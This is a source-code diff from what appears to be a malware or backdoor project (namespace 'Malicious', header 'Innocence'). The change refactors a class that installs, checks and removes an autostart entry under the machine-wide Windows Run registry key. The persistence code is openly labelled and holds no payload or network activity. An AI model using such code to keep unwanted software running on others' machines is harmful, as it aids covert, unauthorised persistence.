@@ -1,8 +1,8 @@
 #include "ProgramStart.hpp"
 
 #include <system/Registry.hpp>
-#include <common/Log.hpp>
-#include <Innocence.hpp>
+#include <log/Log.hpp>
+#include <common/Innocence.hpp>
 
 namespace Malicious
 {
@@ -31,22 +31,22 @@ namespace Malicious
 
     bool ProgramStartupKey::installed()
     {
-		System::Registry::Key startKey(System::Registry::localMachine, Innocence::RUN_KEY_PATH);
-        return startKey.isValueExists(Innocence::RUN_KEY_NAME);
+		System::Registry::Key startKey(System::Registry::localMachine, Common::RUN_KEY_PATH);
+        return startKey.isValueExists(Common::RUN_KEY_NAME);
     }
 
     void ProgramStartupKey::install()
     {
-        System::Registry::Key startKey(System::Registry::localMachine, Innocence::RUN_KEY_PATH);
-        startKey.createValue(Innocence::RUN_KEY_NAME, programPath);
+        System::Registry::Key startKey(System::Registry::localMachine, Common::RUN_KEY_PATH);
+        startKey.createValue(Common::RUN_KEY_NAME, programPath);
     }
 
     void ProgramStartupKey::uninstall()
     {
-        System::Registry::Key startKey(System::Registry::localMachine, Innocence::RUN_KEY_PATH);
-        if(startKey.isValueExists(Innocence::RUN_KEY_NAME))
+        System::Registry::Key startKey(System::Registry::localMachine, Common::RUN_KEY_PATH);
+        if(startKey.isValueExists(Common::RUN_KEY_NAME))
         {
-            startKey.removeValue(Innocence::RUN_KEY_NAME);
+            startKey.removeValue(Common::RUN_KEY_NAME);
         }
     }
 } // Malicious
